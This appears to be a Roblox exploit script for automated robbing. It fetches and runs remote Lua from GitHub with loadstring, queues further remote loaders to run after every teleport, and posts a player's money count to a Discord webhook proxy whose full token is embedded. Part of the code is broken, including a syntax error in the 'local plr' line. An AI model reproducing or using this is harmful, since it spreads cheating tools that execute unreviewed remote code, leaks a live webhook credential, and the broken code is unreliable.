script_key="MRjrzeywawLylClhfMzgiOkaruDccYpi";
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxsta72/ProjectAuto/main/paid"))()
local money = function(Hundreds)
	Hundreds=tonumber(Hundreds)
	local Million = 0
	local Thousand = 0
	local number = 0
	while Hundreds >= 1000 do
		Hundreds-=1000
		Thousand+=1
	end
	while Thousand >= 1000 do	
		Thousand-=1000
		Million+=1
	end
	if Million ~= 0 then number = string.format("$%s,%s,%s", Million, Thousand, Hundreds)
	else number = string.format("$%s,%s", Thousand, Hundreds)
	end
	return number
end
local plr game:GetService("Players").Ethxn1s1ay:WaitForChild("leaderstats").Money.Value
request( { Url = 'https://webhook.lewisakura.moe/api/webhooks/1156980605326741615/_QGf4mMn4FnyGpPuDrPfOV5Te86VNZb8dZ4Rv54TJ735T6k2EIbhok8uD4S5fPC7-aB4', Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode({content = 'Current money count: '..money(plr.leaderstats.Money.Value)}) } );
queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxsta72/ProjectAuto/main/paid"))()')
queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidEthan77/autorobs/main/auto.lua"))()')
